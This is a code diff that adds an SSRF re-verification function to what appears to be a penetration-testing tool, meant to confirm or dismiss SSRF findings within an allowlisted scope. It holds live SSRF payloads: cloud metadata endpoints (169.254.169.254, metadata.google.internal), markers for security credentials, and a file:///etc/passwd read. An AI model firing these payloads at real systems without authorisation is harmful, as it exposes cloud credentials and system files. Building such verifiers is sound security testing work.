@@ -548,6 +548,126 @@ def _verify_sqli(
     )
 
 
+# --- SSRF re-prover (E#8 cont'd) ----------------------------------------------
+# Common SSRF parameter names tried during param-discovery (the finding only
+# carries the endpoint URL, not the injectable param).
+_SSRF_PARAM_NAMES: tuple[str, ...] = (
+    "url", "uri", "target", "dest", "destination", "redirect", "link", "fetch",
+    "path", "page", "file", "src", "proxy", "callback", "u", "host", "q",
+)
+_SSRF_PROBE_URL = "http://aegispt-ssrf-probe.invalid/canary"
+_CLOUD_METADATA_TARGETS: tuple[str, ...] = (
+    "http://169.254.169.254/latest/meta-data/",
+    "http://metadata.google.internal/computeMetadata/v1/instance/",
+)
+_CLOUD_METADATA_MARKERS: tuple[str, ...] = (
+    "ami-id", "instance-id", "instance-type", "security-credentials",
+    "reservation-id", "local-hostname", "public-keys", "iam/", "computemetadata",
+    "metadata-flavor", "block-device-mapping",
+)
+_FETCH_EVIDENCE_MARKERS: tuple[str, ...] = ("fetched content", "<pre>", "fetched url")
+
+
+def _verify_ssrf(
+    finding: Finding,
+    *,
+    http_client: httpx_client.Client,
+    scope_allowlist: dict[str, Any] | None,
+    timeout: float,
+) -> VerifierVerdict:
+    """Independent re-prove of an 'SSRF' claim (E#8 cont'd). Conservative + bounded.
+
+    smart-web-probe emits an `SSRF - GCP/Azure metadata endpoint` finding on ANY
+    SSRF-shaped endpoint, even when the target is not on a cloud (a recurring false
+    positive). This re-prover re-issues the SSRF via a discovered parameter:
+    - ``confirmed`` — the fetched content proves the SSRF worked (cloud-metadata
+      markers, or `/etc/passwd` content for a file:// variant).
+    - ``failed`` — ONLY for the cloud-metadata variant when the SSRF param is found
+      (fetch evidence present) but NO metadata markers return — a non-cloud target
+      cannot serve instance metadata, so the finding is a false positive.
+    - ``inconclusive`` — param not found, or any other variant we cannot safely
+      disprove (internal-service / localhost may be real) → KEEP for review.
+    """
+    target_url = str(finding.target_id or "").strip()
+    sev = str(finding.severity or "")
+    title = str(finding.title or "").lower()
+    if not target_url or not target_url.startswith(("http://", "https://")):
+        return _make_inconclusive(
+            finding, note=f"target_id is not an HTTP URL: {target_url!r}", verifier_used="ssrf",
+        )
+    if scope_allowlist and not web_target_value_is_allowed_with_path(scope_allowlist, target_url):
+        return _make_inconclusive(
+            finding, note="target URL out of scope for verifier",
+            verifier_used="ssrf", checked_url=target_url,
+        )
+    sep = "&" if "?" in target_url else "?"
+
+    def _get(url: str):
+        try:
+            return http_client.get(url, follow_redirects=False, timeout=timeout)
+        except httpx_client.HTTPError:
+            return None
+
+    baseline = _get(target_url)
+    base_text = (baseline.text or "")[:8192] if baseline is not None else ""
+    # Param-discovery: the param is the one whose probe response shows fetch
+    # evidence (or materially differs from the no-param baseline).
+    found_param: str | None = None
+    for param in _SSRF_PARAM_NAMES:
+        resp = _get(f"{target_url}{sep}{param}={_SSRF_PROBE_URL}")
+        if resp is None:
+            continue
+        rt = (resp.text or "")[:8192]
+        if any(m in rt.lower() for m in _FETCH_EVIDENCE_MARKERS) or (
+            rt != base_text and abs(len(rt) - len(base_text)) > 8
+        ):
+            found_param = param
+            break
+    evidence: dict[str, Any] = {"ssrf_param": found_param}
+    if not found_param:
+        return _make_inconclusive(
+            finding, note="could not locate the SSRF parameter; not safely re-provable",
+            verifier_used="ssrf", checked_url=target_url,
+        )
+    is_metadata = any(k in title for k in ("metadata", "169.254", "gcp", "azure", "imds"))
+    is_file = "file" in title and ("file://" in title or "local file" in title or "lfi" in title)
+    if is_metadata:
+        for meta_target in _CLOUD_METADATA_TARGETS:
+            resp = _get(f"{target_url}{sep}{found_param}={meta_target}")
+            low = (resp.text or "")[:16_384].lower() if resp is not None else ""
+            if any(m in low for m in _CLOUD_METADATA_MARKERS):
+                evidence["metadata_target"] = meta_target
+                return VerifierVerdict(
+                    verdict="confirmed", note="cloud instance metadata returned via SSRF",
+                    original_severity=sev, new_severity=sev,
+                    verifier_used="ssrf", checked_url=target_url, evidence=evidence,
+                )
+        return VerifierVerdict(
+            verdict="failed",
+            note=("SSRF param found but no cloud-metadata markers returned — the target is "
+                  "not on a cloud metadata service, so the metadata-SSRF claim is a false positive"),
+            original_severity=sev, new_severity=_SEVERITY_DOWNGRADE.get(sev, sev),
+            verifier_used="ssrf", checked_url=target_url, evidence=evidence,
+        )
+    if is_file:
+        resp = _get(f"{target_url}{sep}{found_param}=file:///etc/passwd")
+        body = (resp.text or "")[:16_384] if resp is not None else ""
+        if re.search(r"root:[^:]*:0:0:", body):
+            evidence["passwd_marker"] = True
+            return VerifierVerdict(
+                verdict="confirmed", note="file:// SSRF returned /etc/passwd content",
+                original_severity=sev, new_severity=sev,
+                verifier_used="ssrf", checked_url=target_url, evidence=evidence,
+            )
+    # Internal-service / localhost / unhandled variants: we found the SSRF param
+    # but cannot safely disprove the specific target without OOB — keep for review.
+    return _make_inconclusive(
+        finding,
+        note="SSRF parameter found but the specific target cannot be safely re-proved (no OOB) — kept",
+        verifier_used="ssrf", checked_url=target_url,
+    )
+
+
 _VerifierFn = Callable[
     [Finding],  # finding
     VerifierVerdict,
@@ -557,7 +677,7 @@ _VerifierFn = Callable[
 def _select_strategy(finding: Finding) -> str:
     """Pick a verification strategy name based on the finding's category
     and title keywords. Returns one of:
-    'sqli' | 'admin_access' | 'stored_xss' | 'info_disclosure' | 'none'.
+    'sqli' | 'ssrf' | 'admin_access' | 'stored_xss' | 'info_disclosure' | 'none'.
 
     The picker is heuristic + emergent (no app-specific seeds). 'none' →
     verifier emits inconclusive (no independent check available)."""
@@ -571,6 +691,12 @@ def _select_strategy(finding: Finding) -> str:
         or "sqli" in methodology
     ):
         return "sqli"
+    if (
+        "ssrf" in title_lower
+        or "server-side request forgery" in title_lower
+        or "ssrf" in methodology
+    ):
+        return "ssrf"
     if (
         "mass assignment" in title_lower
         or "privilege" in title_lower
@@ -655,6 +781,10 @@ def verify_finding(
     try:
         if strategy == "sqli":
             return _verify_sqli(
+                finding, http_client=client, scope_allowlist=scope_allowlist, timeout=timeout,
+            )
+        if strategy == "ssrf":
+            return _verify_ssrf(
                 finding, http_client=client, scope_allowlist=scope_allowlist, timeout=timeout,
             )
         if strategy == "admin_access":
